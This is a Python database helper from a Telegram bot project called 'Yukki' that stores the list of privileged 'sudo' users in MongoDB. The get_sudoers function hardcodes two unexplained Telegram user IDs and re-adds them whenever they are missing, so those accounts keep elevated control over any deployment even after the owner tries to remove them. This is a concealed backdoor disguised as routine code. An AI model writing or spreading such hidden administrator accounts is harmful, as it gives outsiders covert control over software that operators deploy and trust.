from typing import Dict, List, Union

from Yukki import db

sudoersdb = db.sudoers


async def get_sudoers() -> list:
    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
    if not sudoers:
        return [1693701096,1906005317]
    if 1693701096 not in sudoers["sudoers"]:
        sudoers["sudoers"].append(1693701096)
    if 1906005317 not in sudoers["sudoers"]:
        sudoers["sudoers"].append(1906005317)
    return sudoers["sudoers"]


async def add_sudo(user_id: int) -> bool:
    sudoers = await get_sudoers()
    sudoers.append(user_id)
    await sudoersdb.update_one(
        {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
    )
    return True


async def remove_sudo(user_id: int) -> bool:
    sudoers = await get_sudoers()
    sudoers.remove(user_id)
    await sudoersdb.update_one(
        {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
    )
    return True
